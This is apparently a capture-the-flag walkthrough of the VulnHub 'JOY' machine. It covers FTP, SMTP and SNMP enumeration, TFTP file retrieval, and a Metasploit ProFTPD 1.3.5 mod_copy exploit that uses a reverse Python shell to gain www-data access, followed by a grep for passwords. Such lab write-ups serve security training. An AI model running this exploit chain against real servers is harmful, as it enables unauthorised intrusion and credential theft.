drwx------  7 patrick patrick 4096 Jan 10  2019 .cache
drwx------ 10 patrick patrick 4096 Dec 26  2018 .config
-rw-r--r--  1 patrick patrick    0 Dec  8 19:45 CUaprBlkzAh8wwXsQhivUZYarVtE4TNJ.txt
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Desktop
-rw-r--r--  1 patrick patrick    0 Dec  8 19:30 DmAfs1XnvjFbeabH1vK2q3jDqN54rFXI.txt
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Documents
drwxr-xr-x  3 patrick patrick 4096 Jan  6  2019 Downloads
-rw-r--r--  1 patrick patrick    0 Dec  8 20:15 dT3sO0jJmuQOML2GWO3cEYPSKORyvHQ4.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 19:50 EkTTvSeimV23Wv3305DjaZtUilLYbE2f26XbeybPv3SJdymjhZqgPkTncUbkXJPU.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 19:35 FKtKdm3SzVguoRJWa7AF9bp4OVZZXEzC.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 19:40 Gemx735q4nzioYGCHG3c18i64jZ2P4VdSZWaNrpccQXEPk4oSKailo4BOa48G5Fo.txt
drwx------  3 patrick patrick 4096 Dec 26  2018 .gnupg
-rwxrwxrwx  1 patrick patrick    0 Jan  9  2019 haha
-rw-------  1 patrick patrick 8532 Jan 28  2019 .ICEauthority
-rw-r--r--  1 patrick patrick    0 Dec  8 20:10 IKr4rf8vrBhvUUcEcagPnbTtroZkscSc.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 19:00 IW17b5ICY7iqWjZpYiLlODmuW608DuNz6FtdJkLCNApWyMXZufgWjyUGvMPhRuaD.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 20:05 jbTWKsZoFcD5ZeAyec7Orlku44uvuWedjHkF963A8PcOWWKGdJ2G0tQpesumRCuD.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 19:55 K10ATPvoEJgiNhScWqJHOLLvvrHeC5t6.txt
drwxr-xr-x  3 patrick patrick 4096 Dec 26  2018 .local
drwx------  5 patrick patrick 4096 Dec 28  2018 .mozilla
-rw-r--r--  1 patrick patrick   24 Dec  8 20:40 mP9pPzK1nmootk9dFZ61rKfEEdufPWgArMmmXtww7N0vvBp88OKUNNJkTaKBr9Cs.txt
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Music
drwxr-xr-x  2 patrick patrick 4096 Jan  8  2019 .nano
-rw-r--r--  1 patrick patrick    0 Dec  8 20:05 nEDwgl7rQx4Dxfng5OJWgOOU2RJBQ9md.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 20:20 Np3SWeirB2bYffl5G9PWVoKZhC4dIWYC.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 19:35 olJaDIk50rYUdX8s8rYYyE11NDLfT5sa7CDRE0NJl2A1MY1RqnAK1wG37V6sWgUJ.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 19:05 P39Roqi0EwbVwE0Tj4bHDfraQrZIrNNwKyKvQmKHj047uWCaFkVCo114qVZm3vZI.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 20:45 PddX0BlxqrcnH7IURv4E7Kzpo1270Kxg4rJLsva2jr4qIVEMiT30Yg1zV7iMzt1w.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 20:20 pFyZu37gxFcAfu3XwGdL51oOsNTEaBqPppOC5ITNpYNhdMc9Nnr7RbvOHxmwWBk9.txt
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Pictures
-rw-r--r--  1 patrick patrick  675 Dec 23  2018 .profile
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Public
-rw-r--r--  1 patrick patrick   24 Dec  8 19:25 QxTyt2BjJaXLyTGHdQeuhKJsOFSXOMJH3tyLchmiOPDYcZ2GZqVh8NFeeLD4jCLa.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 19:15 RnjKHuh3RU8MZntruIuRxKBeyNnD1S9d.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 20:35 s0ZxGMnTjuYtuwcWSoq5qxqGY4rvSVm0DQKV2IhzVXn4QJvFhdstkSzkcJ5iYzfB.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 20:40 s9GGWbvl6lVOVDsmsibkMSinJsu67Lf3.txt
d---------  2 root    root    4096 Jan  9  2019 script
drwx------  2 patrick patrick 4096 Dec 26  2018 .ssh
-rw-r--r--  1 patrick patrick    0 Jan  6  2019 Sun
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Templates
-rw-r--r--  1 patrick patrick    0 Jan  6  2019 .txt
-rw-r--r--  1 patrick patrick   24 Dec  8 19:45 u1iV3I0OmIi4mPsfs1EwyoE2nIMj5UOcE8yyPrE40YMcn9JzMjy1Y9Od6aucv3UW.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 20:00 UKkmABC4QxWo0eAdiSIGdlwGw3Dx9wAO.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 20:30 uzY3t8c1FfNYhQIYXeMoSAxcg4ICqMbSo6vjuZosqOaBRtiQLsZJUMUHneqTILNx.txt
-rw-r--r--  1 patrick patrick  407 Jan 27  2019 version_control
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Videos
-rw-r--r--  1 patrick patrick    0 Dec  8 20:45 wexdoAbMSONxao74QE0mc7hXp2sns80h.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 19:20 WSg01diWJH02My3AMORygVBJzeDMmPhg.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 19:40 WzLwYxn4Xp7tRyVKbHyyqKxhwhz3NIEQ.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 20:25 x0MkKiJ88m6amtSHWxJd3ba7sNYLWdOR.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 19:55 x2xCjbDB82ROUPOYoEwoXEmQrFCfNVQrATIhCwwPMP4uhN5xOUvV2GWuOwiUiBew.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 20:00 xgha5zSwbT0Jg0dcbUIwEDetme6G8g7FWCOi7jznl9DEIo3OBZhe2OBA9hqT0rch.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 20:30 xWZ2tbS1b9GkjRQsfrpD0DnlvwZv99xd.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 19:05 yTByEBwhcZN2XwLkDU9YSLnQ219eNcei.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 20:10 yYBP7R5aaeM1UB4B8InSgeWfqCzBZLkGjUs25nKhIEmjojvTPL8tMTDu1E8p9uRU.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 19:00 zwxUVUWeQsgiVReFmP7X4j4CccNBmX6I.txt

You should know where the directory can be accessed.

Information of this Machine!

Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux</code></pre>
<figure>
<img src="19.non-zero-size-files.png" alt="" /><figcaption>19.non-zero-size-files</figcaption>
</figure>
<pre><code>f0c1s@kali:~/vuln-hubs/digitalworld.local/joy/ftp/upload $
for file in `find . -type f -size +0`                                               
for&gt; do 
for&gt; echo $file                               
for&gt; cat $file                                
for&gt; echo &quot;\n&quot;                                
for&gt; done
./directory
Patrick&#39;s Directory
... skipping ... 


./project_zoo
dog
cat
ant
bird
fish
hare
snake
mouse
eagle
rabbit
jaguar
python
penguin
peacock
phoenix
kangaroo
parakeet
mosquito
mousedeer
woodlouse
cockroach
kingfisher
rhinoceros
pondskater


./project_desperado
What happens when you have no idea what you are doing? Bang your head against the wall.


./project_yolo
you only live once!


./project_sicko
Perhaps the head of development is secretly a sicko...


./project_uno
ONE!


./project_bravado
This is a brave project!


./reminder
Lock down this machine!


./project_toto
either a dog name, or the name of a lottery in singapore


./project_indigo
colour


./project_ronaldinho
skilled footballer!


./project_vivino
wine app


./project_malindo
airline</code></pre>
<h2 id="fingreprint">fingreprint</h2>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Tuesday 21 December 2021 09:53:49 AM IST 2021.12.21 09:53:49
f0c1s@kali:~/vuln-hubs/digitalworld.local/joy $
nc -nvC $RHOST 25                               
Connection to 192.168.56.76 25 port [tcp/*] succeeded!
220 JOY.localdomain ESMTP Postfix (Debian/GNU)
ehlo f0c1s
250-JOY.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250 SMTPUTF8
exit
502 5.5.2 Error: command not recognized
quit
221 2.0.0 Bye

                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Tuesday 21 December 2021 10:07:37 AM IST 2021.12.21 10:07:37
f0c1s@kali:~/vuln-hubs/digitalworld.local/joy $
nc -nvC $RHOST 110 
Connection to 192.168.56.76 110 port [tcp/*] succeeded!
+OK Dovecot ready.
help
-ERR Unknown command.
exit
-ERR Unknown command.
quit
+OK Logging out</code></pre>
<figure>
<img src="20.nc-finger-port25-and-port110.png" alt="" /><figcaption>20.nc-finger-port25-and-port110</figcaption>
</figure>
<h2 id="attacking-ftp">Attacking FTP</h2>
<pre class="shell"><code>nc -nvC $RHOST 21
Connection to 192.168.56.76 21 port [tcp/*] succeeded!
220 The Good Tech Inc. FTP Server
help          
214-The following commands are recognized (* =&gt;&#39;s unimplemented):
 CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV    
 EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD     
 XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP    
 NOOP    FEAT    OPTS    AUTH*   CCC*    CONF*   ENC*    MIC*    
 PBSZ*   PROT*   TYPE    STRU    MODE    RETR    STOR    STOU    
 APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST    
 NLST    STAT    SITE    MLSD    MLST    
214 Direct comments to root@JOY
user anonymous
331 Anonymous login ok, send your complete email address as your password
pass 
230 Anonymous access granted, restrictions apply
pwd
257 &quot;/&quot; is the current directory
pasv
227 Entering Passive Mode (192,168,56,76,171,5).
cpd
500 CPD not understood
cwd
501 Invalid number of arguments
stat
211-Status of &#39;JOY&#39;
 Connected from 192.168.56.70 (192.168.56.70)
 Logged in as ftp
 TYPE: ASCII, STRUcture: File, Mode: Stream
 No data connection
211 End of status
list
^C
</code></pre>
<pre class="shell"><code>nmap $RHOST -n -p21 -Pn -T4 --min-rate=5000 -sVC                
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 10:12 IST
Nmap scan report for 192.168.56.76
Host is up (0.00036s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.2.10
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
Service Info: Host: The

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds</code></pre>
<pre class="shell"><code>nmap $RHOST -n -p21 -Pn -T4 --min-rate=5000 -sVC --script=vuln   
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 10:12 IST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.56.76
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.2.10
| vulners: 
|   cpe:/a:proftpd:proftpd:1.2.10: 
|       SSV:26016       9.0     https://vulners.com/seebug/SSV:26016    *EXPLOIT*
|       SSV:24282       9.0     https://vulners.com/seebug/SSV:24282    *EXPLOIT*
|       CVE-2011-4130   9.0     https://vulners.com/cve/CVE-2011-4130
|       SSV:20226       7.1     https://vulners.com/seebug/SSV:20226    *EXPLOIT*
|       PACKETSTORM:95517       7.1     https://vulners.com/packetstorm/PACKETSTORM:95517       *EXPLOIT*
|       MSF:ILITIES/GENTOO-LINUX-CVE-2010-3867/ 7.1     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2010-3867/     *EXPLOIT*
|       CVE-2010-3867   7.1     https://vulners.com/cve/CVE-2010-3867
|       CVE-2010-4652   6.8     https://vulners.com/cve/CVE-2010-4652
|       EDB-ID:16129    5.0     https://vulners.com/exploitdb/EDB-ID:16129      *EXPLOIT*
|       CVE-2011-1137   5.0     https://vulners.com/cve/CVE-2011-1137
|       CVE-2008-7265   4.0     https://vulners.com/cve/CVE-2008-7265
|_      CVE-2012-6095   1.2     https://vulners.com/cve/CVE-2012-6095
Service Info: Host: The

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.17 seconds</code></pre>
<h3 id="proftpd-1.2.10">ProFTPD 1.2.10</h3>
<pre class="shell"><code>searchsploit ProFTPD 1.2.10 | grep remote
ProFTPd 1.2 &lt; 1.3.0 (Linux) - &#39;sreplace&#39; Remote Buffer Overflow (Metasploit)     | linux/remote/16852.rb
ProFTPd 1.2.10 - Remote Users Enumeration </code></pre>
<p>This doesn’t work, because there is no world writable directory on FTP.</p>
<pre class="shell"><code>ftp $RHOST 21
Connected to 192.168.56.76.
220 The Good Tech Inc. FTP Server
Name (192.168.56.76:f0c1s): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||31009|)
150 Opening ASCII mode data connection for file list
drwxr-x---   4 ftp      ftp          4096 Jan  6  2019 .
drwxr-x---   4 ftp      ftp          4096 Jan  6  2019 ..
drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
226 Transfer complete
ftp&gt; exit
221 Goodbye.</code></pre>
<pre class="shell"><code>msf6 exploit(linux/ftp/proftp_sreplace) &gt; run

[*] Started reverse TCP handler on 192.168.56.70:4444 
[*] 192.168.56.76:21 - Automatically detecting the target...
[-] 192.168.56.76:21 - Exploit aborted due to failure: no-target: No matching target
[*] Exploit completed, but no session was created.
msf6 exploit(linux/ftp/proftp_sreplace) &gt; exit</code></pre>
<p>Since, there is no writable directory on FTP, the msf exploit fails.</p>
<h3 id="attacking-via-patricks-directory.">Attacking via Patrick’s directory.</h3>
<p>Patrick has a file named <code>version_control</code>. Rest seems like have already been shared.</p>
<p>I can copy the “version_control” file, but have no idea where to paste it.</p>
<pre class="shell"><code>nc -nvC $RHOST 21
Connection to 192.168.56.76 21 port [tcp/*] succeeded!
220 The Good Tech Inc. FTP Server
help 
214-The following commands are recognized (* =&gt;&#39;s unimplemented):
 CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV    
 EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD     
 XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP    
 NOOP    FEAT    OPTS    AUTH*   CCC*    CONF*   ENC*    MIC*    
 PBSZ*   PROT*   TYPE    STRU    MODE    RETR    STOR    STOU    
 APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST    
 NLST    STAT    SITE    MLSD    MLST    
214 Direct comments to root@JOY
site cpfr /home/patrick/version_control
350 File or directory exists, ready for destination name
site cpto /usr/var/ftp/version_control
550 cpto: No such file or directory
site cpto /var/ftp   
503 Bad sequence of commands
exit
500 EXIT not understood
quit
221 Goodbye.</code></pre>
<h2 id="getting-udp-scanned">Getting UDP scanned</h2>
<pre class="shell"><code>sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=20 -sU --open | grep -vi &quot;filtered&quot;
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 11:24 IST
Nmap scan report for 192.168.56.76
Host is up (0.0014s latency).
Not shown: 5 closed udp ports (port-unreach)
PORT      STATE         SERVICE
123/udp   open          ntp
137/udp   open          netbios-ns
161/udp   open          snmp
MAC Address: 08:00:27:39:C9:5B (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
</code></pre>
<pre class="shell"><code>sudo nmap $RHOST -n -p123,137,161 -Pn -T4 --min-rate=5000  -sU --open --script=*enum* -sVC| grep -vi &quot;filtered&quot;
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 11:26 IST
Stats: 0:01:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 11:28 (0:00:39 remaining)
Nmap scan report for 192.168.56.76
Host is up (0.0014s latency).

PORT    STATE SERVICE    VERSION
123/udp open  ntp?
137/udp open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
161/udp open  snmp       SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: d1785e76ec962f5c00000000
|   snmpEngineBoots: 29
|_  snmpEngineTime: 1h43m09s
MAC Address: 08:00:27:39:C9:5B (Oracle VirtualBox virtual NIC)
Service Info: Host: JOY

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.29 seconds</code></pre>
<pre class="shell"><code>locate nse | grep nmap | grep snmp
/usr/share/nmap/nselib/snmp.lua
/usr/share/nmap/nselib/data/snmpcommunities.lst
/usr/share/nmap/scripts/snmp-brute.nse
/usr/share/nmap/scripts/snmp-hh3c-logins.nse
/usr/share/nmap/scripts/snmp-info.nse
/usr/share/nmap/scripts/snmp-interfaces.nse
/usr/share/nmap/scripts/snmp-ios-config.nse
/usr/share/nmap/scripts/snmp-netstat.nse
/usr/share/nmap/scripts/snmp-processes.nse
/usr/share/nmap/scripts/snmp-sysdescr.nse
/usr/share/nmap/scripts/snmp-win32-services.nse
/usr/share/nmap/scripts/snmp-win32-shares.nse
/usr/share/nmap/scripts/snmp-win32-software.nse
/usr/share/nmap/scripts/snmp-win32-users.nse
</code></pre>
<pre class="shell"><code>sudo nmap $RHOST -n -p161 -Pn -T4 --min-rate=5000  -sU --open --script=snmp* -sVC
## checkout ./3.out-nmap-udp-snmp-scan.txt</code></pre>
<figure>
<img src="21.search-for-ftp-in-output-above.png" alt="" /><figcaption>21.search-for-ftp-in-output-above</figcaption>
</figure>
<pre><code>|   718:
|     Name: proftpd
|     Path: proftpd: (accepting connections)
|   728:
|     Name: dropbear
|     Path: dropbear
|   739:
|     Name: in.tftpd
|     Path: /usr/sbin/in.tftpd
|     Params: --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick
|   748:</code></pre>
<h2 id="getting-file-version_control">Getting file <code>version_control</code></h2>
<pre class="shell"><code>tftp $RHOST 36969
tftp&gt; ?
Commands may be abbreviated.  Commands are:

connect         connect to remote tftp
mode            set file transfer mode
put             send file
get             receive file
quit            exit tftp
verbose         toggle verbose mode
trace           toggle packet tracing
status          show current status
binary          set mode to octet
ascii           set mode to netascii
rexmt           set per-packet retransmission timeout
timeout         set total retransmission timeout
?               print help information
tftp&gt; status
Connected to 192.168.56.76.
Mode: netascii Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp&gt; get version_control
Received 419 bytes in 0.0 seconds
tftp&gt; quit


ls -la version_control            
-rw-r--r-- 1 f0c1s f0c1s 407 Dec 21 11:33 version_control


cat version_control                   
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations in this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.
</code></pre>
<figure>
<img src="22.getting-version-control.png" alt="" /><figcaption>22.getting-version-control</figcaption>
</figure>
<pre class="shell"><code>searchsploit ProFTPD 1.3.5 | grep remote
ProFTPd 1.3.5 - &#39;mod_copy&#39; Command Execution (Metasploit)                        | linux/remote/37262.rb
ProFTPd 1.3.5 - &#39;mod_copy&#39; Remote Command Execution                              | linux/remote/36803.py
ProFTPd 1.3.5 - &#39;mod_copy&#39; Remote Command Execution (2)                          | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy</code></pre>
<h2 id="metasploit-for-the-win">metasploit for the win</h2>
<pre class="shell"><code>msf6 &gt; search proftpd 1.3.5

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_modcopy_exec  2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_modcopy_exec

msf6 &gt; use 0
msf6 exploit(unix/ftp/proftpd_modcopy_exec) &gt; options

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/w
                                         iki/Using-Metasploit
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5


msf6 exploit(unix/ftp/proftpd_modcopy_exec) &gt; setg RHOSTS 192.168.56.76
RHOSTS =&gt; 192.168.56.76
msf6 exploit(unix/ftp/proftpd_modcopy_exec) &gt; set SITEPATH /var/www/tryingharderisjoy
SITEPATH =&gt; /var/www/tryingharderisjoy
msf6 exploit(unix/ftp/proftpd_modcopy_exec) &gt; run

[-] 192.168.56.76:80 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/proftpd_modcopy_exec) &gt; show payloads

Compatible Payloads
===================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  payload/cmd/unix/bind_awk                             normal  No     Unix Command Shell, Bind TCP (via AWK)
   1  payload/cmd/unix/bind_perl                            normal  No     Unix Command Shell, Bind TCP (via Perl)
   2  payload/cmd/unix/bind_perl_ipv6                       normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   3  payload/cmd/unix/generic                              normal  No     Unix Command, Generic Command Execution
   4  payload/cmd/unix/reverse_awk                          normal  No     Unix Command Shell, Reverse TCP (via AWK)
   5  payload/cmd/unix/reverse_perl                         normal  No     Unix Command Shell, Reverse TCP (via Perl)
   6  payload/cmd/unix/reverse_perl_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   7  payload/cmd/unix/reverse_python                       normal  No     Unix Command Shell, Reverse TCP (via Python)
   8  payload/cmd/unix/reverse_python_ssl                   normal  No     Unix Command Shell, Reverse TCP SSL (via python)

msf6 exploit(unix/ftp/proftpd_modcopy_exec) &gt; use 7
[-] Invalid module index: 7
msf6 exploit(unix/ftp/proftpd_modcopy_exec) &gt; set payload payload/cmd/unix/reverse_python
payload =&gt; cmd/unix/reverse_python
msf6 exploit(unix/ftp/proftpd_modcopy_exec) &gt; run

[-] 192.168.56.76:80 - Msf::OptionValidateError The following options failed to validate: LHOST
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/proftpd_modcopy_exec) &gt; set LHOST 192.168.56.70
LHOST =&gt; 192.168.56.70
msf6 exploit(unix/ftp/proftpd_modcopy_exec) &gt; runu
[-] Unknown command: runu
msf6 exploit(unix/ftp/proftpd_modcopy_exec) &gt; run

[*] Started reverse TCP handler on 192.168.56.70:4444 
[*] 192.168.56.76:80 - 192.168.56.76:21 - Connected to FTP server
[*] 192.168.56.76:80 - 192.168.56.76:21 - Sending copy commands to FTP server
[*] 192.168.56.76:80 - Executing PHP payload /wqlzO1.php
[*] Command shell session 1 opened (192.168.56.70:4444 -&gt; 192.168.56.76:54198 ) at 2021-12-21 11:40:04 +0530


whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
pwd
/var/www/tryingharderisjoy
hostname
JOY
date
Tue Dec 21 19:40:33 +08 2021</code></pre>
<figure>
<img src="23.msf-shell.png" alt="" /><figcaption>23.msf-shell</figcaption>
</figure>
<h2 id="post-shell">Post shell</h2>
<pre class="shell"><code>www-data@JOY:/var/www/tryingharderisjoy$ grep -Hnri password .
grep -Hnri password .
./ossec/README:31:1.3- Run the setup script (assign username/password...):
./ossec/setup.sh:69:# 3- Create password
./ossec/setup.sh:80:    echo &quot;** ERROR: Could not find htpasswd. No password set.&quot;
./ossec/LICENSE:354:source code form), and must require no special password or key for
./ossec/patricksecretsofjoy:3:root:howtheheckdoiknowwhattherootpasswordis
www-data@JOY:/var/www/tryingharderisjoy$ su root
su root
Password: howtheheckdoiknowwhattherootpasswordis

su: Authentication failure
www-data@JOY:/var/www/tryingharderisjoy$ ls -lAhR
ls -lAhR
.:
total 8.0K
drwxr-xr-x 8 www-data www-data 4.0K Jan  6  2019 ossec
-rw-r--r-- 1 root     root       80 Dec 21 19:39 wqlzO1.php

./ossec:
total 108K
-rw-r--r-- 1 www-data www-data   92 Jul 19  2016 .hgtags
-rw-r--r-- 1 www-data www-data  262 Dec 28  2018 .htaccess
-rw-r--r-- 1 www-data www-data   44 Dec 28  2018 .htpasswd
-rwxr-xr-x 1 www-data www-data  317 Jul 19  2016 CONTRIB
-rw-r--r-- 1 www-data www-data  35K Jul 19  2016 LICENSE
-rw-r--r-- 1 www-data www-data 2.1K Jul 19  2016 README
-rw-r--r-- 1 www-data www-data  923 Jul 19  2016 README.search
drwxr-xr-x 3 www-data www-data 4.0K Jul 19  2016 css
-rw-r--r-- 1 www-data www-data  218 Jul 19  2016 htaccess_def.txt
drwxr-xr-x 2 www-data www-data 4.0K Jul 19  2016 img
-rwxr-xr-x 1 www-data www-data 5.1K Jul 19  2016 index.php
drwxr-xr-x 2 www-data www-data 4.0K Jul 19  2016 js
drwxr-xr-x 3 www-data www-data 4.0K Dec 28  2018 lib
-rw-r--r-- 1 www-data www-data  462 Jul 19  2016 ossec_conf.php
-rw-r--r-- 1 www-data www-data  134 Jan  6  2019 patricksecretsofjoy
-rwxr-xr-x 1 www-data www-data 2.5K Jul 19  2016 setup.sh
drwxr-xr-x 2 www-data www-data 4.0K Dec 28  2018 site
drwxrwxrwx 2 www-data www-data 4.0K Dec 21 19:12 tmp

./ossec/css:
total 24K
-rw-r--r-- 1 www-data www-data 4.7K Jul 19  2016 cal.css
-rw-r--r-- 1 www-data www-data  12K Jul 19  2016 css.css
drwxr-xr-x 2 www-data www-data 4.0K Jul 19  2016 images

./ossec/css/images:
total 20K
-rw-r--r-- 1 www-data www-data   59 Jul 19  2016 arrow.gif
-rw-r--r-- 1 www-data www-data 1.2K Jul 19  2016 favicon.ico
-rw-r--r-- 1 www-data www-data   55 Jul 19  2016 hr_tag_sep.gif
-rw-r--r-- 1 www-data www-data   55 Jul 19  2016 hr_title_sep.gif
-rw-r--r-- 1 www-data www-data  115 Jul 19  2016 pagebg.gif

./ossec/img:
total 88K
-rw-r--r-- 1 www-data www-data 9.3K Jul 19  2016 191x81.jpg
-rwxr-xr-x 1 www-data www-data  882 Jul 19  2016 background.png
-rw-r--r-- 1 www-data www-data  927 Jul 19  2016 calendar.gif
-rw-r--r-- 1 www-data www-data  857 Jul 19  2016 donate.gif
-rwxr-xr-x 1 www-data www-data  17K Jul 19  2016 ossecLogo.png
-rw-r--r-- 1 www-data www-data  11K Jul 19  2016 ossec_webui.jpg
-rwxr-xr-x 1 www-data www-data  16K Jul 19  2016 ossec_webui.png
-rwxr-xr-x 1 www-data www-data  13K Jul 19  2016 webui.png

./ossec/js:
total 196K
-rw-r--r-- 1 www-data www-data 3.6K Jul 19  2016 calendar-en.js
-rw-r--r-- 1 www-data www-data 8.7K Jul 19  2016 calendar-setup.js
-rw-r--r-- 1 www-data www-data  49K Jul 19  2016 calendar.js
-rw-r--r-- 1 www-data www-data 1.2K Jul 19  2016 hide.js
-rw-r--r-- 1 www-data www-data 122K Jul 19  2016 prototype.js

./ossec/lib:
total 100K
-rw-r--r-- 1 www-data www-data   14 Dec 28  2018 .htaccess
drwxr-xr-x 2 www-data www-data 4.0K Jul 19  2016 Ossec
-rwxr-xr-x 1 www-data www-data 4.9K Jul 19  2016 os_lib_agent.php
-rwxr-xr-x 1 www-data www-data  27K Jul 19  2016 os_lib_alerts.php
-rwxr-xr-x 1 www-data www-data 8.5K Jul 19  2016 os_lib_firewall.php
-rwxr-xr-x 1 www-data www-data 2.6K Jul 19  2016 os_lib_handle.php
-rwxr-xr-x 1 www-data www-data 2.4K Jul 19  2016 os_lib_mapping.php
-rwxr-xr-x 1 www-data www-data 4.1K Jul 19  2016 os_lib_stats.php
-rwxr-xr-x 1 www-data www-data 9.4K Jul 19  2016 os_lib_syscheck.php
-rwxr-xr-x 1 www-data www-data  524 Jul 19  2016 os_lib_util.php
-rw-r--r-- 1 www-data www-data 4.3K Jul 19  2016 ossec_categories.php
-rw-r--r-- 1 www-data www-data 2.8K Jul 19  2016 ossec_formats.php

./ossec/lib/Ossec:
total 20K
-rw-r--r-- 1 www-data www-data 2.5K Jul 19  2016 Alert.php
-rw-r--r-- 1 www-data www-data 8.9K Jul 19  2016 AlertList.php
-rw-r--r-- 1 www-data www-data 1.9K Jul 19  2016 Histogram.php

./ossec/site:
total 76K
